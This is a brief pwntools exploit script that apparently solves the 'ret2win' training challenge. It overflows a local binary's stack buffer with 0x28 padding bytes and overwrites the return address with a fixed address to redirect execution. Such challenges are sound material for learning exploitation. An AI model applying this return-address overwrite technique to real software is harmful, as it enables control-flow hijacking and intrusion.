from pwn import *
context.log_level = 'debug'

sh = process("./ret2win")
sh.recv()
payload = flat(b'a' * 0x28, p64(0x0000000000400824))
sh.sendline(payload)
sh.recv()